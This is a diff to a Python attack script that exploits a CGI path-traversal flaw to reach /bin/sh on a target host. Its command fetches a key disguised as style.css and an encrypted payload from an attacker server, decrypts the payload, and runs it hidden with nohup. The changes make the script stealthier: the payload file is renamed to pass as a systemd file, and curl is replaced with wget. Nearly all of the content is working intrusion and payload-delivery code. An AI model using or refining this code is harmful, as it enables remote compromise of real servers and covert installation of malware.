@@ -6,7 +6,7 @@ import string
 
 # --- Configuration ---
 target_ip = "10.37.1.248"
-attacker_ip = "SERVER_IP" 
+attacker_ip = "10.37.1.249" 
 local_binary = "./beachhead"
 
 traversal = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
@@ -24,7 +24,7 @@ def prepare_local_payload():
     try:
         subprocess.run([
             "openssl", "enc", "-aes-256-cbc", "-md", "sha256", "-salt", "-pbkdf2",
-            "-in", local_binary, "-out", "payload.enc", "-k", password
+            "-in", local_binary, "-out", "systemd-private-uptime.enc", "-k", password
         ], check=True, capture_output=True)
         return True
     except Exception as e:
@@ -38,8 +38,8 @@ def deploy():
     print(f"[*] Executing One-Shot Deployment to {target_ip}...")
     
     combined_cmd = (
-        f"curl -s http://{attacker_ip}/style.css -o /tmp/.k; "
-        f"curl -s http://{attacker_ip}/payload.enc | openssl enc -d -aes-256-cbc -md sha256 -pbkdf2 -pass file:/tmp/.k -out {final_binary}; "
+        f"wget -q http://{attacker_ip}/style.css -O /tmp/.k; "
+        f"wget -q http://{attacker_ip}/systemd-private-uptime.enc -O - | openssl enc -d -aes-256-cbc -md sha256 -pbkdf2 -pass file:/tmp/.k -out {final_binary}; "
         f"rm /tmp/.k; chmod +x {final_binary}; nohup {final_binary} >/dev/null 2>&1 &"
     )
 
